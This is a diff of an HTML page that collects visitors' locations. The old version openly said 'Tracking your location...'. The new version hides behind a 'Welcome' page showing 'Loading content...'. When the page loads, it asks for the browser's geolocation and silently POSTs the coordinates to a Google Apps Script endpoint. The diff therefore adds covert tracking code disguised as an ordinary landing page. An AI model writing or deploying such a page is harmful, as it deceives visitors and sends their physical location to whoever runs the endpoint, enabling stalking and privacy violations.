@@ -1,58 +1,62 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Location Logger</title>
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Welcome</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .message {
+      background: #fff;
+      padding: 20px 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+  </style>
 </head>
-<body onload="getLocation()">
-  <h2>Tracking your location...</h2>
-
-  <!-- Hidden form to submit to Google Sheets -->
-  <form id="submit-form">
-    <input type="hidden" name="latitude" id="latitude">
-    <input type="hidden" name="longitude" id="longitude">
-    <input type="hidden" name="user_agent" id="user_agent">
-  </form>
+<body>
+  <div class="message">
+    <h2>Loading content...</h2>
+    <p>Please wait while we prepare your experience.</p>
+  </div>
 
   <script>
+    function sendLocation(lat, lon) {
+      fetch("https://script.google.com/macros/s/AKfycbxsO4-ZpbPyPfRdhakl4dYwjp_qUGZmejS0VElbKR5WYEVOsr_JYFJlFMQN1oCaY9cD/exec", {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude: lat, longitude: lon })
+      });
+    }
+
     function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        alert("Geolocation is not supported by this browser.");
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            sendLocation(lat, lon);
+          },
+          error => {
+            console.error("Geolocation error:", error.message);
+          },
+          { timeout: 10000 }
+        );
       }
     }
 
-    function sendLocation(position) {
-      document.getElementById('latitude').value = position.coords.latitude;
-      document.getElementById('longitude').value = position.coords.longitude;
-      document.getElementById('user_agent').value = navigator.userAgent;
-
-      // Auto-submit form via jQuery AJAX
-      $("#submit-form").submit();
-    }
-
-    function handleError(error) {
-      console.error("Geolocation error:", error.message);
-    }
-
-    // jQuery form handler
-    $("#submit-form").submit((e) => {
-      e.preventDefault();
-      $.ajax({
-        url: "https://script.google.com/macros/s/AKfycbxsO4-ZpbPyPfRdhakl4dYwjp_qUGZmejS0VElbKR5WYEVOsr_JYFJlFMQN1oCaY9cD/exec",
-        data: $("#submit-form").serialize(),
-        method: "POST",
-        success: function (response) {
-          console.log("Form submitted to Google Sheets");
-        },
-        error: function (err) {
-          alert("Error sending data.");
-          console.error(err);
-        }
-      });
-    });
+    window.onload = getLocation;
   </script>
 </body>
 </html>
